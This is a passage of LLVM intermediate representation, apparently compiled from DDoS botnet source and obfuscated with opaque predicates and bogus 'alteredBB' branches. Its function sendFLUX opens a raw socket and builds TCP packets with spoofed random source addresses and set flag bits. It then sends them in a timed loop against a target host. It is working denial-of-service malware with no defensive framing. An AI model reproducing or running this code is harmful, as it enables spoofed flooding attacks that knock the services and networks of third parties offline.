; <label>:428:                                    ; preds = %424
  %429 = load i32, i32* @x.65
  %430 = load i32, i32* @y.66
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %428
  %437 = load i32, i32* @x.65
  %438 = load i32, i32* @y.66
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br label %449

; <label>:445:                                    ; preds = %424
  store i32 0, i32* %25, align 4
  br label %377

; <label>:446:                                    ; preds = %378
  %447 = load i32, i32* %25, align 4
  %448 = add i32 %447, 1
  store i32 %448, i32* %25, align 4
  br label %377

; <label>:449:                                    ; preds = %originalBBpart226
  %450 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %450)
  br label %451

; <label>:451:                                    ; preds = %449, %75, %67, %originalBBpart2
  %452 = load i32, i32* @x.65
  %453 = load i32, i32* @y.66
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %451
  %460 = load i32, i32* @x.65
  %461 = load i32, i32* @y.66
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %205
  %468 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %469 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %468, i32 0, i32 0
  %470 = bitcast %union.anon.0* %469 to %struct.anon.1*
  %471 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %470, i32 0, i32 4
  %472 = load i16, i16* %471, align 4
  %_ = sub i16 %472, -257
  %gen = mul i16 %_, -257
  %473 = and i16 %472, -257
  %_2 = shl i16 %473, 256
  %_3 = sub i16 %473, 256
  %gen4 = mul i16 %_3, 256
  %474 = or i16 %473, 256
  store i16 %474, i16* %471, align 4
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %241
  %475 = load i8*, i8** %23, align 8
  %476 = call i32 @strcmp(i8* %475, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i32 0, i32 0)) #10
  %477 = icmp ne i32 %476, 0
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %274
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %292
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %311
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %428
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %451
  br label %originalBB28
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendFLUX(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %23 = load i32, i32* %12, align 4
  store i32 %23, i32* %13, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %47

; <label>:27:                                     ; preds = %6
  %28 = load i32, i32* @x.67
  %29 = load i32, i32* @y.68
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = call i32 @rand_cmwc()
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  %39 = load i32, i32* @x.67
  %40 = load i32, i32* @y.68
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %52

; <label>:47:                                     ; preds = %6
  %48 = load i32, i32* %8, align 4
  %49 = trunc i32 %48 to i16
  %50 = call zeroext i16 @htons(i16 zeroext %49) #13
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %50, i16* %51, align 2
  br label %52

; <label>:52:                                     ; preds = %47, %originalBBpart2
  %53 = load i8*, i8** %7, align 8
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %55 = call i32 @getHost(i8* %53, %struct.in_addr* %54)
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %363

; <label>:58:                                     ; preds = %52
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %60 = getelementptr inbounds [8 x i8], [8 x i8]* %59, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 8, i32 4, i1 false)
  %61 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %61, i32* %15, align 4
  %62 = load i32, i32* %15, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

; <label>:64:                                     ; preds = %58
  br label %363

; <label>:65:                                     ; preds = %58
  %66 = load i32, i32* @x.67
  %67 = load i32, i32* @y.68
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  store i32 1, i32* %16, align 4
  %74 = load i32, i32* %15, align 4
  %75 = bitcast i32* %16 to i8*
  %76 = call i32 @setsockopt(i32 %74, i32 0, i32 3, i8* %75, i32 4) #2
  %77 = icmp slt i32 %76, 0
  %78 = load i32, i32* @x.67
  %79 = load i32, i32* @y.68
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %77, label %86, label %87

; <label>:86:                                     ; preds = %originalBBpart24
  br label %363

; <label>:87:                                     ; preds = %originalBBpart24
  %88 = load i32, i32* %10, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %107

; <label>:90:                                     ; preds = %87
  %91 = load i32, i32* @x.67
  %92 = load i32, i32* @y.68
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  store i32 0, i32* %17, align 4
  %99 = load i32, i32* @x.67
  %100 = load i32, i32* @y.68
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %129

; <label>:107:                                    ; preds = %87
  %108 = load i32, i32* @x.67
  %109 = load i32, i32* @y.68
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %107
  %116 = load i32, i32* %10, align 4
  %117 = sub nsw i32 32, %116
  %118 = shl i32 1, %117
  %119 = sub nsw i32 %118, 1
  %120 = xor i32 %119, -1
  store i32 %120, i32* %17, align 4
  %121 = load i32, i32* @x.67
  %122 = load i32, i32* @y.68
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart242, label %originalBB10alteredBB

originalBBpart242:                                ; preds = %originalBB10
  br label %129

; <label>:129:                                    ; preds = %originalBBpart242, %originalBBpart28
  %130 = load i32, i32* %11, align 4
  %131 = sext i32 %130 to i64
  %132 = add i64 40, %131
  %133 = call i8* @llvm.stacksave()
  store i8* %133, i8** %18, align 8
  %134 = alloca i8, i64 %132, align 16
  %135 = bitcast i8* %134 to %struct.iphdr*
  store %struct.iphdr* %135, %struct.iphdr** %19, align 8
  %136 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = getelementptr i8, i8* %137, i64 20
  %139 = bitcast i8* %138 to %struct.tcphdr*
  store %struct.tcphdr* %139, %struct.tcphdr** %20, align 8
  %140 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %142 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %17, align 4
  %145 = call i32 @GetRandomIP(i32 %144)
  %146 = call i32 @htonl(i32 %145) #13
  %147 = load i32, i32* %11, align 4
  %148 = sext i32 %147 to i64
  %149 = add i64 20, %148
  %150 = trunc i64 %149 to i32
  call void @makeIPPacket(%struct.iphdr* %140, i32 %143, i32 %146, i8 zeroext 6, i32 %150)
  %151 = call zeroext i16 @htons(i16 zeroext 5678) #13
  %152 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %153 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %152, i32 0, i32 0
  %154 = bitcast %union.anon.0* %153 to %struct.anon.1*
  %155 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %154, i32 0, i32 0
  store i16 %151, i16* %155, align 4
  %156 = call i32 @rand() #2
  %157 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon.0* %158 to %struct.anon.1*
  %160 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %159, i32 0, i32 2
  store i32 %156, i32* %160, align 4
  %161 = call i32 @rand_cmwc()
  %162 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i32 0, i32 0
  %164 = bitcast %union.anon.0* %163 to %struct.anon.1*
  %165 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %164, i32 0, i32 3
  store i32 %161, i32* %165, align 4
  %166 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.0* %167 to %struct.anon.1*
  %169 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = and i16 %170, 16383
  store i16 %171, i16* %169, align 4
  %172 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %173 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.0* %173 to %struct.anon.1*
  %175 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %174, i32 0, i32 4
  %176 = load i16, i16* %175, align 4
  %177 = and i16 %176, -241
  %178 = or i16 %177, 80
  store i16 %178, i16* %175, align 4
  %179 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %180 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %179, i32 0, i32 0
  %181 = bitcast %union.anon.0* %180 to %struct.anon.1*
  %182 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %181, i32 0, i32 4
  %183 = load i16, i16* %182, align 4
  %184 = and i16 %183, -513
  %185 = or i16 %184, 512
  store i16 %185, i16* %182, align 4
  %186 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon.0* %187 to %struct.anon.1*
  %189 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -4097
  %192 = or i16 %191, 4096
  store i16 %192, i16* %189, align 4
  %193 = call i32 @rand_cmwc()
  %194 = trunc i32 %193 to i16
  %195 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 0
  %197 = bitcast %union.anon.0* %196 to %struct.anon.1*
  %198 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %197, i32 0, i32 5
  store i16 %194, i16* %198, align 2
  %199 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 0
  %201 = bitcast %union.anon.0* %200 to %struct.anon.1*
  %202 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %201, i32 0, i32 6
  store i16 0, i16* %202, align 4
  %203 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon.0* %204 to %struct.anon.1*
  %206 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %205, i32 0, i32 7
  store i16 0, i16* %206, align 2
  %207 = load i32, i32* %8, align 4
  %208 = icmp eq i32 %207, 0
  br i1 %208, label %209, label %211

; <label>:209:                                    ; preds = %129
  %210 = call i32 @rand_cmwc()
  br label %216

; <label>:211:                                    ; preds = %129
  %212 = load i32, i32* %8, align 4
  %213 = trunc i32 %212 to i16
  %214 = call zeroext i16 @htons(i16 zeroext %213) #13
  %215 = zext i16 %214 to i32
  br label %216

; <label>:216:                                    ; preds = %211, %209
  %217 = phi i32 [ %210, %209 ], [ %215, %211 ]
  %218 = load i32, i32* @x.67
  %219 = load i32, i32* @y.68
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %216
  %226 = trunc i32 %217 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 0
  %229 = bitcast %union.anon.0* %228 to %struct.anon.1*
  %230 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %229, i32 0, i32 1
  store i16 %226, i16* %230, align 2
  %231 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %232 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %233 = call zeroext i16 @tcpcsum(%struct.iphdr* %231, %struct.tcphdr* %232)
  %234 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.0* %235 to %struct.anon.1*
  %237 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %236, i32 0, i32 6
  store i16 %233, i16* %237, align 4
  %238 = bitcast i8* %134 to i16*
  %239 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 2
  %241 = load i16, i16* %240, align 2
  %242 = zext i16 %241 to i32
  %243 = call zeroext i16 @csum(i16* %238, i32 %242)
  %244 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 7
  store i16 %243, i16* %245, align 2
  %246 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %247 = load i32, i32* %9, align 4
  %248 = add nsw i32 %246, %247
  store i32 %248, i32* %21, align 4
  store i32 0, i32* %22, align 4
  %249 = load i32, i32* @x.67
  %250 = load i32, i32* @y.68
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %257

; <label>:257:                                    ; preds = %358, %originalBBpart258, %originalBBpart246
  %258 = load i32, i32* @x.67
  %259 = load i32, i32* @y.68
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %257
  %266 = load i32, i32* @x.67
  %267 = load i32, i32* @y.68
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %274

; <label>:274:                                    ; preds = %originalBBpart250
  %275 = load i32, i32* @x.67
  %276 = load i32, i32* @y.68
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %274
  %283 = load i32, i32* %15, align 4
  %284 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %285 = call i64 @sendto(i32 %283, i8* %134, i64 %132, i32 0, %struct.sockaddr* %284, i32 16)
  %286 = load i32, i32* %17, align 4
  %287 = call i32 @GetRandomIP(i32 %286)
  %288 = call i32 @htonl(i32 %287) #13
  %289 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 3
  store i16 %292, i16* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon.0* %297 to %struct.anon.1*
  %299 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %298, i32 0, i32 2
  store i32 %295, i32* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.0* %303 to %struct.anon.1*
  %305 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %304, i32 0, i32 0
  store i16 %301, i16* %305, align 4
  %306 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon.0* %307 to %struct.anon.1*
  %309 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %308, i32 0, i32 6
  store i16 0, i16* %309, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %311 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %312 = call zeroext i16 @tcpcsum(%struct.iphdr* %310, %struct.tcphdr* %311)
  %313 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon.0* %314 to %struct.anon.1*
  %316 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %315, i32 0, i32 6
  store i16 %312, i16* %316, align 4
  %317 = bitcast i8* %134 to i16*
  %318 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 2
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = call zeroext i16 @csum(i16* %317, i32 %321)
  %323 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 7
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %22, align 4
  %326 = load i32, i32* %13, align 4
  %327 = icmp eq i32 %325, %326
  %328 = load i32, i32* @x.67
  %329 = load i32, i32* @y.68
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %327, label %336, label %358

; <label>:336:                                    ; preds = %originalBBpart254
  %337 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %338 = load i32, i32* %21, align 4
  %339 = icmp sgt i32 %337, %338
  br i1 %339, label %340, label %341

; <label>:340:                                    ; preds = %336
  br label %361

; <label>:341:                                    ; preds = %336
  %342 = load i32, i32* @x.67
  %343 = load i32, i32* @y.68
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %341
  store i32 0, i32* %22, align 4
  %350 = load i32, i32* @x.67
  %351 = load i32, i32* @y.68
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %257

; <label>:358:                                    ; preds = %originalBBpart254
  %359 = load i32, i32* %22, align 4
  %360 = add i32 %359, 1
  store i32 %360, i32* %22, align 4
  br label %257

; <label>:361:                                    ; preds = %340
  %362 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %362)
  br label %363

; <label>:363:                                    ; preds = %361, %86, %64, %57
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %364 = call i32 @rand_cmwc()
  %365 = trunc i32 %364 to i16
  %366 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %365, i16* %366, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  store i32 1, i32* %16, align 4
  %367 = load i32, i32* %15, align 4
  %368 = bitcast i32* %16 to i8*
  %369 = call i32 @setsockopt(i32 %367, i32 0, i32 3, i8* %368, i32 4) #2
  %370 = icmp slt i32 %369, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  store i32 0, i32* %17, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %107
  %371 = load i32, i32* %10, align 4
  %_ = sub i32 32, %371
  %gen = mul i32 %_, %371
  %372 = sub nsw i32 32, %371
  %_11 = sub i32 1, %372
  %gen12 = mul i32 %_11, %372
  %_13 = sub i32 1, %372
  %gen14 = mul i32 %_13, %372
  %_15 = sub i32 1, %372
  %gen16 = mul i32 %_15, %372
  %_17 = sub i32 0, 1
  %gen18 = add i32 %_17, %372
  %_19 = shl i32 1, %372
  %373 = shl i32 1, %372
  %_20 = sub i32 %373, 1
  %gen21 = mul i32 %_20, 1
  %_22 = sub i32 0, %373
  %gen23 = add i32 %_22, 1
  %_24 = sub i32 %373, 1
  %gen25 = mul i32 %_24, 1
  %_26 = sub i32 0, %373
  %gen27 = add i32 %_26, 1
  %_28 = sub i32 %373, 1
  %gen29 = mul i32 %_28, 1
  %_30 = sub i32 0, %373
  %gen31 = add i32 %_30, 1
  %_32 = shl i32 %373, 1
  %374 = sub nsw i32 %373, 1
  %_33 = sub i32 0, %374
  %gen34 = add i32 %_33, -1
  %_35 = sub i32 0, %374
  %gen36 = add i32 %_35, -1
  %_37 = shl i32 %374, -1
  %_38 = sub i32 0, %374
  %gen39 = add i32 %_38, -1
  %_40 = shl i32 %374, -1
  %375 = xor i32 %374, -1
  store i32 %375, i32* %17, align 4
  br label %originalBB10

originalBB44alteredBB:                            ; preds = %originalBB44, %216
  %376 = trunc i32 %217 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 0
  %379 = bitcast %union.anon.0* %378 to %struct.anon.1*
  %380 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %379, i32 0, i32 1
  store i16 %376, i16* %380, align 2
  %381 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %382 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %383 = call zeroext i16 @tcpcsum(%struct.iphdr* %381, %struct.tcphdr* %382)
  %384 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 0
  %386 = bitcast %union.anon.0* %385 to %struct.anon.1*
  %387 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %386, i32 0, i32 6
  store i16 %383, i16* %387, align 4
  %388 = bitcast i8* %134 to i16*
  %389 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 2
  %391 = load i16, i16* %390, align 2
  %392 = zext i16 %391 to i32
  %393 = call zeroext i16 @csum(i16* %388, i32 %392)
  %394 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %394, i32 0, i32 7
  store i16 %393, i16* %395, align 2
  %396 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %397 = load i32, i32* %9, align 4
  %398 = add nsw i32 %396, %397
  store i32 %398, i32* %21, align 4
  store i32 0, i32* %22, align 4
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %257
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %274
  %399 = load i32, i32* %15, align 4
  %400 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %401 = call i64 @sendto(i32 %399, i8* %134, i64 %132, i32 0, %struct.sockaddr* %400, i32 16)
  %402 = load i32, i32* %17, align 4
  %403 = call i32 @GetRandomIP(i32 %402)
  %404 = call i32 @htonl(i32 %403) #13
  %405 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %406 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %405, i32 0, i32 8
  store i32 %404, i32* %406, align 4
  %407 = call i32 @rand_cmwc()
  %408 = trunc i32 %407 to i16
  %409 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 3
  store i16 %408, i16* %410, align 4
  %411 = call i32 @rand_cmwc()
  %412 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
